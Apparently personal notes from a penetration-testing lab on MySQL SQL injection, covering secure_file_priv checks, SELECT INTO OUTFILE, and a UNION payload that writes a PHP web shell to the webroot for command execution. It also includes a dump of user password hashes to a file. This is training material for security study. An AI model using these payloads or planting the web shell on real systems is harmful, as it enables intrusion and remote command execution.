## Write File Privileges
To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

#### secure_file_priv
The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from.
An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable.
On the other hand, `NULL` means we cannot read/write from any directory.

So, let's see how we can find out the value of `secure_file_priv`. Within `MySQL`, we can use the following query to obtain the value of this variable:
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database.
`MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.
The final SQL query is the following:
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```


```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
![[Pasted image 20251119114536.png]]
And the result shows that the `secure_file_priv` value is empty, meaning that we can read/write files to any location.

## SELECT INTO OUTFILE
Now that we have confirmed that our user should write files to the back-end server, let's try to do 
that using the `SELECT .. INTO OUTFILE` statement.

```SQL
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```shell
cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```


It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
The `test.txt` file was created successfully and is owned by the `mysql` user.

## Writing Files through SQL Injection
Let's try writing a text file to the webroot and verify if we have write permissions.
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

The `UNION` injection payload would be as follows:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
![[Pasted image 20251119121837.png]]
Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.

## Writing a Web Shell
```php
<?php system($_REQUEST[0]); ?>
```

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:
![[Pasted image 20251119121935.png]]